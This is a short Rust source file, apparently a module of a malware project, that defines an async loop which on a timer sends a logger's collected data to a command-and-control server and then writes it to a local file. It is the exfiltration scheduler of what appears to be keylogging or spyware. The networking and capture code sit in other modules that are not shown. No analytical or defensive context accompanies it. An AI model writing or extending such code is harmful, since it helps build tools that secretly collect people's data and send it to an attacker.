use tokio::time::{sleep, Duration};
use std::sync::Arc;
use crate::logger::Logger;
use crate::config::c2_interval;

pub async fn c2_sender(logger: Arc<Logger>) {
    loop {
        sleep(Duration::from_secs(c2_interval())).await;
        logger.send_to_c2().await;
        logger.flush_to_file();
    }
}